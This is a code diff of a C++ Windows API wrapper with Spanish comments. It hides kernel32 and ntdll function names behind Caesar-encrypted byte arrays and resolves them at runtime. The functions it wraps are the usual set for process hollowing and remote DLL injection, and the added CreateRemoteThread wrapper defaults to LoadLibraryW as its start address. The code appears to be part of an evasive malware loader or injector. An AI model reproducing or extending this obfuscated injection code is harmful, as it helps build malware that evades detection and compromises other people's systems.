@@ -1,12 +1,12 @@
-#include "system_utils\WinAPIWrapper.h"
+﻿#include "system_utils\WinAPIWrapper.h"
 #include <Obfuscator.h>
 
 WinAPIWrapper::WinAPIWrapper() {
-	std::vector<unsigned char> kernel32 = { 0x49, 0x43, 0x50, 0x4c, 0x43, 0x4a, 0x11, 0x10, 0xc, 0x42, 0x4a, 0x4a };
-	std::vector<unsigned char> ntdll = { 0x4c, 0x52, 0x42, 0x4a, 0x4a, 0x0c, 0x42, 0x4a, 0x4a };
+	std::vector<unsigned char> kernel32	= { 0x49, 0x43, 0x50, 0x4c, 0x43, 0x4a, 0x11, 0x10, 0xc, 0x42, 0x4a, 0x4a };
+	std::vector<unsigned char> ntdll	= { 0x4c, 0x52, 0x42, 0x4a, 0x4a, 0x0c, 0x42, 0x4a, 0x4a };
 
-	hKernel32 = GetModuleHandleA(Obfuscator::DecryptCaesar(kernel32, 0xDE).c_str());
-	hNtdll = GetModuleHandleA(Obfuscator::DecryptCaesar(ntdll, 0xDE).c_str());
+	hKernel32 = GetModuleHandleA(Obfuscator::decryptCaesar(kernel32, 0xDE).c_str());
+	hNtdll = GetModuleHandleA(Obfuscator::decryptCaesar(ntdll, 0xDE).c_str());
 
 	if (hKernel32 && hNtdll) {
 		_LoadFunctions();
@@ -14,8 +14,8 @@ WinAPIWrapper::WinAPIWrapper() {
 }
 
 WinAPIWrapper::~WinAPIWrapper() {
-	if (hKernel32) FreeLibrary(hKernel32);
-	if (hNtdll) FreeLibrary(hNtdll);
+	//if (hKernel32) FreeLibrary(hKernel32);
+	//if (hNtdll) FreeLibrary(hNtdll);
 	//     loadedFunctions.clear();  // Limpia el mapa al finalizar
 }
 
@@ -23,6 +23,7 @@ void WinAPIWrapper::_LoadFunctions() {
 
 	// Nombres de las funciones cifradas
 	std::vector<unsigned char> CreateProcessA		= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x1f };
+	std::vector<unsigned char> CreateProcessW		= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x35 };
 	std::vector<unsigned char> WriteProcessMemory	= { 0x35, 0x50, 0x47, 0x52, 0x43, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x2b, 0x43, 0x4b, 0x4d, 0x50, 0x57 };
 	std::vector<unsigned char> VirtualProtectEx		= { 0x34, 0x47, 0x50, 0x52, 0x53, 0x3f, 0x4a, 0x2e, 0x50, 0x4d, 0x52, 0x43, 0x41, 0x52, 0x23, 0x56 };
 	std::vector<unsigned char> SetThreadContext		= { 0x31, 0x43, 0x52, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42, 0x21, 0x4d, 0x4c, 0x52, 0x43, 0x56, 0x52 };
@@ -32,22 +33,32 @@ void WinAPIWrapper::_LoadFunctions() {
 	std::vector<unsigned char> NtUnmapViewOfSection = { 0x2c, 0x52, 0x33, 0x4c, 0x4b, 0x3f, 0x4e, 0x34, 0x47, 0x43, 0x55, 0x2d, 0x44, 0x31, 0x43, 0x41, 0x52, 0x47, 0x4d, 0x4c };
 	std::vector<unsigned char> GetThreadContext		= { 0x25, 0x43, 0x52, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42, 0x21, 0x4d, 0x4c, 0x52, 0x43, 0x56, 0x52 };
 	std::vector<unsigned char> CreateThread			= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };
+	std::vector<unsigned char> LoadLibraryA			= { 0x2a, 0x4d, 0x3f, 0x42, 0x2a, 0x47, 0x40, 0x50, 0x3f, 0x50, 0x57, 0x1f };
+	std::vector<unsigned char> LoadLibraryW			= { 0x2a, 0x4d, 0x3f, 0x42, 0x2a, 0x47, 0x40, 0x50, 0x3f, 0x50, 0x57, 0x35 };
+	std::vector<unsigned char> CreateRemoteThread	= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x30, 0x43, 0x4b, 0x4d, 0x52, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };
+	std::vector<unsigned char> TerminateProcess		= { 0x32, 0x43, 0x50, 0x4b, 0x47, 0x4c, 0x3f, 0x52, 0x43, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51 };
 
 	// Descifrado de nombres de funciones
-	std::string CreateProcessA_str			= Obfuscator::DecryptCaesar(CreateProcessA, 0xDE);
-	std::string WriteProcessMemory_str		= Obfuscator::DecryptCaesar(WriteProcessMemory, 0xDE);
-	std::string VirtualProtectEx_str		= Obfuscator::DecryptCaesar(VirtualProtectEx, 0xDE);
-	std::string SetThreadContext_str		= Obfuscator::DecryptCaesar(SetThreadContext, 0xDE);
-	std::string ResumeThread_str			= Obfuscator::DecryptCaesar(ResumeThread, 0xDE);
-	std::string VirtualAllocEx_str			= Obfuscator::DecryptCaesar(VirtualAllocEx, 0xDE);
-	std::string ReadProcessMemory_str		= Obfuscator::DecryptCaesar(ReadProcessMemory, 0xDE);
-	std::string NtUnmapViewOfSection_str	= Obfuscator::DecryptCaesar(NtUnmapViewOfSection, 0xDE);
-	std::string GetThreadContext_str		= Obfuscator::DecryptCaesar(GetThreadContext, 0xDE);
-	std::string CreateThread_str			= Obfuscator::DecryptCaesar(CreateThread, 0xDE);
+	std::string CreateProcessA_str			= Obfuscator::decryptCaesar(CreateProcessA, 0xDE);
+	std::string CreateProcessW_str			= Obfuscator::decryptCaesar(CreateProcessW, 0xDE);
+	std::string WriteProcessMemory_str		= Obfuscator::decryptCaesar(WriteProcessMemory, 0xDE);
+	std::string VirtualProtectEx_str		= Obfuscator::decryptCaesar(VirtualProtectEx, 0xDE);
+	std::string SetThreadContext_str		= Obfuscator::decryptCaesar(SetThreadContext, 0xDE);
+	std::string ResumeThread_str			= Obfuscator::decryptCaesar(ResumeThread, 0xDE);
+	std::string VirtualAllocEx_str			= Obfuscator::decryptCaesar(VirtualAllocEx, 0xDE);
+	std::string ReadProcessMemory_str		= Obfuscator::decryptCaesar(ReadProcessMemory, 0xDE);
+	std::string NtUnmapViewOfSection_str	= Obfuscator::decryptCaesar(NtUnmapViewOfSection, 0xDE);
+	std::string GetThreadContext_str		= Obfuscator::decryptCaesar(GetThreadContext, 0xDE);
+	std::string CreateThread_str			= Obfuscator::decryptCaesar(CreateThread, 0xDE);
+	std::string LoadLibraryA_str			= Obfuscator::decryptCaesar(LoadLibraryA, 0xDE);
+	std::string LoadLibraryW_str			= Obfuscator::decryptCaesar(LoadLibraryW, 0xDE);
+	std::string CreateRemoteThread_str		= Obfuscator::decryptCaesar(CreateRemoteThread, 0xDE);
+	std::string TerminateProcess_str		= Obfuscator::decryptCaesar(TerminateProcess, 0xDE);
 
     if (hKernel32) {
 		// Obtener las direcciones de las funciones
         CreateProcessA_		= reinterpret_cast<pCreateProcessA>(GetProcAddress(hKernel32, CreateProcessA_str.c_str()));
+        CreateProcessW_		= reinterpret_cast<pCreateProcessW>(GetProcAddress(hKernel32, CreateProcessW_str.c_str()));
         VirtualAllocEx_		= reinterpret_cast<pVirtualAllocEx>(GetProcAddress(hKernel32, VirtualAllocEx_str.c_str()));
         WriteProcessMemory_ = reinterpret_cast<pWriteProcessMemory>(GetProcAddress(hKernel32, WriteProcessMemory_str.c_str()));
         GetThreadContext_	= reinterpret_cast<pGetThreadContext>(GetProcAddress(hKernel32, GetThreadContext_str.c_str()));
@@ -55,6 +66,10 @@ void WinAPIWrapper::_LoadFunctions() {
         SetThreadContext_	= reinterpret_cast<pSetThreadContext>(GetProcAddress(hKernel32, SetThreadContext_str.c_str()));
         ResumeThread_		= reinterpret_cast<pResumeThread>(GetProcAddress(hKernel32, ResumeThread_str.c_str()));
         CreateThread_		= reinterpret_cast<pCreateThread>(GetProcAddress(hKernel32, CreateThread_str.c_str()));
+		LoadLibraryA_		= reinterpret_cast<pLoadLibraryA>(GetProcAddress(hKernel32, LoadLibraryA_str.c_str()));
+		LoadLibraryW_		= reinterpret_cast<pLoadLibraryW>(GetProcAddress(hKernel32, LoadLibraryW_str.c_str()));
+		CreateRemoteThread_	= reinterpret_cast<pCreateRemoteThread>(GetProcAddress(hKernel32, CreateRemoteThread_str.c_str()));
+		TerminateProcess_	= reinterpret_cast<pTerminateProcess>(GetProcAddress(hKernel32, TerminateProcess_str.c_str()));
     }
 
     if (hNtdll) {
@@ -67,6 +82,13 @@ BOOL WinAPIWrapper::CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine
     LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
     LPPROCESS_INFORMATION lpProcessInformation) {
     return CreateProcessA_ ? CreateProcessA_(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation) : FALSE;
+}
+
+BOOL WinAPIWrapper::CreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags,
+    LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo,
+    LPPROCESS_INFORMATION lpProcessInformation) {
+    return CreateProcessW_ ? CreateProcessW_(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation) : FALSE;
 }
 
 LPVOID WinAPIWrapper::VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
@@ -99,4 +121,31 @@ DWORD WinAPIWrapper::ResumeThread(HANDLE hThread) {
 
 HANDLE WinAPIWrapper::CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
 	return CreateThread_ ? CreateThread_(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : NULL;
+}
+
+HMODULE WinAPIWrapper::LoadLibraryA(LPCSTR lpLibFileName) {
+	return LoadLibraryA_ ? LoadLibraryA_(lpLibFileName) : NULL;
+}
+
+HMODULE WinAPIWrapper::LoadLibraryW(LPCWSTR lpLibFileName) {
+	return LoadLibraryW_ ? LoadLibraryW_(lpLibFileName) : NULL;
+}
+
+HANDLE WinAPIWrapper::CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
+	if (lpStartAddress == nullptr) {
+		if (LoadLibraryW_) {
+			lpStartAddress = (LPTHREAD_START_ROUTINE)LoadLibraryW_;
+			Logger::debug("CreateRemoteThread: Using LoadLibraryW as default start address");
+		}
+		else {
+			Logger::error("CreateRemoteThread: lpStartAddress is null and LoadLibraryW not available");
+			return NULL;
+		}
+	}
+
+	return CreateRemoteThread_ ? CreateRemoteThread_(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : NULL;
+}
+
+BOOL WinAPIWrapper::TerminateProcess(HANDLE hProcess, UINT uExitCode) {
+	return TerminateProcess_ ? TerminateProcess_(hProcess, uExitCode) : NULL;
 }
